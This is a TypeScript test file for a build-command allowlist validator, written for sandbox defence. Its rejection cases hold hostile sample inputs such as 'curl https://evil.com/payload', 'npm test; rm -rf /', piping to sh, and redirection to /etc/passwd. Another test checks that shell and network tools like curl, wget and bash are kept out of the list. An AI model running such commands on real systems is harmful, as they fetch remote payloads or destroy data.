import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { checkBuildCommand, listAllowedBinaries } from "./buildCommandAllowlist.js";

describe("checkBuildCommand — basic acceptance", () => {
  it("accepts a simple `npm test` invocation", () => {
    const r = checkBuildCommand("npm test");
    assert.equal(r.ok, true);
    assert.equal(r.binary, "npm");
  });

  it("accepts `bun run docs:api`", () => {
    const r = checkBuildCommand("bun run docs:api");
    assert.equal(r.ok, true);
    assert.equal(r.binary, "bun");
  });

  it("accepts a multi-arg command like `npm install --frozen-lockfile`", () => {
    const r = checkBuildCommand("npm install --frozen-lockfile");
    assert.equal(r.ok, true);
    assert.equal(r.binary, "npm");
  });

  it("normalizes binary case", () => {
    const r = checkBuildCommand("NPM test");
    assert.equal(r.ok, true);
    assert.equal(r.binary, "npm");
  });

  it("trims surrounding whitespace before parsing", () => {
    const r = checkBuildCommand("   npm   test   ");
    assert.equal(r.ok, true);
    assert.equal(r.binary, "npm");
  });
});

describe("checkBuildCommand — rejection cases", () => {
  it("rejects an empty command", () => {
    const r = checkBuildCommand("");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /empty/);
  });

  it("rejects a whitespace-only command", () => {
    const r = checkBuildCommand("   \t\n  ");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /empty/);
  });

  it("rejects an unallowed binary like `curl`", () => {
    const r = checkBuildCommand("curl https://evil.com/payload");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /not in the build-command allowlist/);
    assert.match(r.reason!, /curl/);
  });

  it("rejects an unallowed binary even when args contain an allowed one", () => {
    // The first token is what counts.
    const r = checkBuildCommand("sh -c 'npm test'");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /sh/);
  });

  it("rejects command chaining with `;`", () => {
    const r = checkBuildCommand("npm test; rm -rf /");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden shell metacharacter/);
  });

  it("rejects command chaining with `&&`", () => {
    const r = checkBuildCommand("npm test && curl evil.com");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden shell metacharacter/);
  });

  it("rejects pipes", () => {
    const r = checkBuildCommand("npm test | sh");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden/);
  });

  it("rejects output redirection", () => {
    const r = checkBuildCommand("npm test > /etc/passwd");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden/);
  });

  it("rejects command substitution with backticks", () => {
    const r = checkBuildCommand("npm `whoami`");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden/);
  });

  it("rejects command substitution with $()", () => {
    const r = checkBuildCommand("npm test $(whoami)");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden/);
  });

  it("rejects environment variable expansion that uses $", () => {
    // Not actually expansion, but $ is forbidden as a precaution.
    const r = checkBuildCommand("npm test $HOME");
    assert.equal(r.ok, false);
    assert.match(r.reason!, /forbidden/);
  });
});

describe("listAllowedBinaries", () => {
  it("returns a sorted alphabetical list", () => {
    const list = listAllowedBinaries();
    const sorted = [...list].sort();
    assert.deepEqual(list, sorted);
  });

  it("includes the package managers we use most", () => {
    const list = new Set(listAllowedBinaries());
    assert.ok(list.has("npm"));
    assert.ok(list.has("bun"));
    assert.ok(list.has("pnpm"));
    assert.ok(list.has("yarn"));
  });

  it("includes the doc generator that motivated this allowlist", () => {
    const list = new Set(listAllowedBinaries());
    assert.ok(list.has("typedoc"));
    assert.ok(list.has("jsdoc"));
  });

  it("does NOT include shell utilities that could egress the sandbox", () => {
    const list = new Set(listAllowedBinaries());
    assert.ok(!list.has("sh"));
    assert.ok(!list.has("bash"));
    assert.ok(!list.has("curl"));
    assert.ok(!list.has("wget"));
    assert.ok(!list.has("eval"));
    assert.ok(!list.has("exec"));
  });
});
